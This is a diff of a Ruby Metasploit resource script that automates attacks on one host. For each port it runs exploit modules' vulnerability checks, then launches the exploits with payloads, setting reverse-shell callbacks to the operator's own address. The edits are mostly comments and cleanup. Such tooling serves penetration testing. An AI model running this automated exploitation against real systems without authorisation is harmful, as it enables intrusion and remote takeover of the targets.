@@ -74,7 +74,6 @@ def exploit_checker(host,ports,architecture)
     end
 
     # remove modules that we won't check:
-    #next if not (name =~ /dlink_upnp/)
     next if (name =~ /local/ or
              name =~ /fileformat/ or
              name =~ /browser/)
@@ -84,12 +83,11 @@ def exploit_checker(host,ports,architecture)
                  name =~ /freebsd/ or
                  name =~ /unix/ or
                  name =~ /openbsd/)
-    # remove modules with known issues - we need to check them again and adjust the settings:
+    # remove modules with issues - we need to check them again and adjust the settings:
     next if (name =~ /cve_2020_13160_anydesk/ or
              name =~ /goahead_ldpreload/ or
              name =~ /phpmailer_arg_injection/ or
              name =~ /atutor_filemanager_traversal/)
-
 
     ports.split(",").each { |serv|
       # we test only matching ports - default RPORT of module matches
@@ -111,7 +109,9 @@ def exploit_checker(host,ports,architecture)
 
       print_status("Checking #{name} against host #{host.to_s}:#{serv} ...")
       begin
+        # Vuln check:
         result = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
+
         if mod.job_id
           print_status("Check #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
           @job_ids << mod.job_id
@@ -127,7 +127,7 @@ def exploit_checker(host,ports,architecture)
         end
 
         if (result.to_s =~ /safe/)
-          print_status("Check code is safe - skipping exploitation attempt")
+          print_status("Check code is safe - skipping exploitation attempt for #{name}")
           next
         end
       rescue ::Exception => e
@@ -149,11 +149,12 @@ def exploit_checker(host,ports,architecture)
         mod.datastore['LPORT'] = lport_setting
         if get_payload.to_s =~ /reverse/
           mod.datastore['LHOST'] = Rex::Socket.source_address("#{host.to_s}") 
-          # print_line("Setting LHOST to #{mod.datastore['LHOST']}")
         end
-        # print_line("Setting LPORT to #{mod.datastore['LPORT']}")
-        mod.datastore['PAYLOAD'] = "#{get_payload}"
+        mod.datastore['PAYLOAD'] = get_payload.to_s
+
+        # Exploitation:
         result = mod.exploit_simple({'RunAsJob': true, 'LocalOutput': self.output})
+
         # looks like the job handling does not work as expected - mod.job_id is empty
         if mod.job_id
           print_status("Exploit #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
@@ -210,13 +211,8 @@ begin
     return
   end
 
-  # as we have no db connection we need to analyze the logs
-  # logs with colors make things usually harder to grep
-  run_single("color true")
-  run_single("setg ConsoleLogging true")
-  run_single("setg SessionLogging true")
   exploit_checker(args[:host],args[:ports],args[:architecture])
-  # todo:
+  # future extension:
   # auxiliary_checker(args[:host],args[:ports],args[:arch])
 rescue ArgumentError => e
   print_error("Invalid argument: #{e.message}")
